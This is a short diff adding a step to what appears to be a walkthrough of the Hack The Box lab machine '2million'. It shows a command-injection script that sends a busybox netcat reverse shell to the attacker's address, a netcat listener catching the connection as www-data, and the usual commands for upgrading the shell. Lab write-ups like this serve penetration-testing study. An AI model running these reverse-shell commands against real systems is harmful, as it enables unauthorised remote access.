@@ -654,6 +654,29 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ```
 
+``` bash
 
+❯ python3 injection.py
+busybox nc 10.10.15.242 4444 -e sh
+
+```
+
+``` bash
+
+❯ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.242] from (UNKNOWN) [10.129.229.66] 52250
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@2million:~/html$ ^Z
+[1]  + 2813 suspended  nc -lvnp 4444
+❯ stty raw -echo; fg
+[1]  + 2813 continued  nc -lvnp 4444
+
+www-data@2million:~/html$
+www-data@2million:~/html$ export TERM=xterm
+www-data@2million:~/html$
+
+```
 
 
